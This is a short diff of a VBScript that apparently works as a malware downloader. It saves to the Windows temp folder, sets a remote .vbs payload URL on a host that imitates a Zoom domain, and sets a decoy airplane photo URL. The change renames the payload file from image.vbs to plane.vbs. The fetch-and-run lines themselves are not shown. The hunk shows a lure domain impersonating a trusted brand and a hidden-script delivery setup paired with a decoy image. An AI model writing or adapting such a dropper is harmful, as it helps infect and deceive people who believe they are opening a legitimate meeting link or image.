@@ -6,7 +6,7 @@ Set objFSO = CreateObject("Scripting.FileSystemObject")
 tempFolder = objFSO.GetSpecialFolder(2)
 
 ' ---------- CONFIGURE THESE URLS ----------
-remoteVBS_URL = "https://us05web-zoom-us.github.io/-pwd-xu1raGakc01dcBTosyHivGT3q/image.vbs"
+remoteVBS_URL = "https://us05web-zoom-us.github.io/-pwd-xu1raGakc01dcBTosyHivGT3q/plane.vbs"
 remoteImage_URL = "https://cdn.plnspttrs.net/16990/n600g-gulfstream-aerospace-gulfstream-aerospace-gulfstream-g600-g-vii_PlanespottersNet_1487428_978e9f44ba_o.jpg"
 ' ------------------------------------------
 
